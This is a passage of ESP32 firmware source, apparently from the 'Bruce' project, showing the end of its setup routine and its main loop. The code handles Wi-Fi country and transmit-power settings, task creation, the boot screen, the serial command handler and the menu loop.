#ifdef CONFIG_ESP_PHY_MAX_TX_POWER
        .max_tx_power = CONFIG_ESP_PHY_MAX_TX_POWER,
#endif
        .policy = WIFI_COUNTRY_POLICY_MANUAL};
    esp_wifi_set_max_tx_power(80);
    esp_wifi_set_country(&country);
    _post_setup_gpio();

    xTaskCreate(taskInputHandler, "InputHandler", INPUT_HANDLER_TASK_STACK_SIZE, NULL, 2, &xHandle);
    
#if defined(HAS_SCREEN)
    bruceConfig.openThemeFile(bruceConfig.themeFS(), bruceConfig.themePath, false);
    if (!bruceConfig.instantBoot) {
        boot_screen_anim();
        startup_sound();
    }
    if (bruceConfig.wifiAtStartup) {
        log_i("Loading Wifi at Startup");
        xTaskCreate(wifiConnectTask, "wifiConnectTask", 4096, NULL, 2, NULL);
    }
#endif
    startSerialCommandsHandlerTask(true);
    wakeUpScreen();
    if (bruceConfig.startupApp != "" && !startupApp.startApp(bruceConfig.startupApp)) {
        bruceConfig.setStartupApp("");
    }
}

#if defined(HAS_SCREEN)
void loop() {
#if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
    if (interpreter_state > 0) {
        vTaskDelay(pdMS_TO_TICKS(10));
        interpreter_state = 2;
        Serial.println("Entering interpreter...");
        while (interpreter_state > 0) { vTaskDelay(pdMS_TO_TICKS(500)); }
        if (interpreter_state == 0) {
            Serial.println("Interpreter put to background.");
        } else {
            Serial.println("Exiting interpreter...");
        }
        if (interpreter_state == -1) { interpreterTaskHandler = NULL; }
        previousMillis = millis();
    }
#endif
    tft.fillScreen(bruceConfig.bgColor);
    mainMenu.begin();
    delay(1);
}
#else
void loop() {
    tft.setLogging();
    Serial.println("\n██████  ██████  ██    ██  ██████ ███████ \n██   ██ ██   ██ ██    ██ ██      ██      \n██████  ██████  ██    ██ ██      █████   \n██   ██ ██   ██ ██    ██ ██      ██      \n██████  ██   ██  ██████   ██████ ███████ \n\n         PREDATORY FIRMWARE\n\nTips: Connect to the WebUI for better experience\n      Add your network by sending: wifi add ssid password\n\nAt your command:");
    tft.fillScreen(bruceConfig.bgColor);
    mainMenu.begin();
    vTaskDelay(10 / portTICK_PERIOD_MS);
}
#endif
